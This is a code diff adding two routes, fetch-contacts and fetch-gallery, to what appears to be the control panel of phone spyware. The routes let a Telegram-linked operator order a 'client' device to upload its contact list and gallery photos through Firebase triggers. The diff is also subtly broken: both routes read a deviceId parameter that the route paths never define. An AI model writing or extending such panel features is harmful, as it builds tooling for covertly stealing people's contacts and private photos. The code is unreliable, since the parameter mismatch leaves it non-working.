@@ -662,6 +662,56 @@ router.patch("/device/:id", requireAuth, writeLimiter, async (req, res) => {
 });
 
 // ── DELETE /api/device/:id — remove a client (admin) ────────────────────
+// ── POST /api/device/:id/fetch-contacts — panel route that proxies the
+//   Firebase webhookEvent/fetchContacts trigger so the web UI can request
+//   contact dump without hitting RTDB directly.
+router.post("/device/:id/fetch-contacts", requireAuth, writeLimiter, async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const auth = (req as any).auth as { telegramId: string; isAdmin?: boolean };
+    const me = String(auth.telegramId);
+    const admin = auth.isAdmin === true || isAdminTg(me);
+    const client = await fbGet(`clients/${deviceId}`);
+    if (!client) return res.status(404).json({ error: "Device not found" });
+    if (client.ownerTelegramId && String(client.ownerTelegramId) !== me && !admin) {
+      return res.status(403).json({ error: "Not owner of this device" });
+    }
+    const ts = Date.now();
+    await fbSet(`clients/${deviceId}/webhookEvent/fetchContacts`, {
+      requestedAt: ts,
+      status: "pending",
+      requestedBy: me,
+    });
+    res.json({ success: true, kind: "contacts", requestedAt: ts });
+  } catch (err) {
+    res.status(500).json({ error: "Failed to request fetch" });
+  }
+});
+
+// ── POST /api/device/:id/fetch-gallery — same, for gallery photos.
+router.post("/device/:id/fetch-gallery", requireAuth, writeLimiter, async (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    const auth = (req as any).auth as { telegramId: string; isAdmin?: boolean };
+    const me = String(auth.telegramId);
+    const admin = auth.isAdmin === true || isAdminTg(me);
+    const client = await fbGet(`clients/${deviceId}`);
+    if (!client) return res.status(404).json({ error: "Device not found" });
+    if (client.ownerTelegramId && String(client.ownerTelegramId) !== me && !admin) {
+      return res.status(403).json({ error: "Not owner of this device" });
+    }
+    const ts = Date.now();
+    await fbSet(`clients/${deviceId}/webhookEvent/fetchGallery`, {
+      requestedAt: ts,
+      status: "pending",
+      requestedBy: me,
+    });
+    res.json({ success: true, kind: "gallery", requestedAt: ts });
+  } catch (err) {
+    res.status(500).json({ error: "Failed to request fetch" });
+  }
+});
+
 router.delete("/device/:id", requireAdmin, writeLimiter, async (req, res) => {
   try {
     const id = Array.isArray(req.params.id) ? req.params.id[0] : req.params.id;
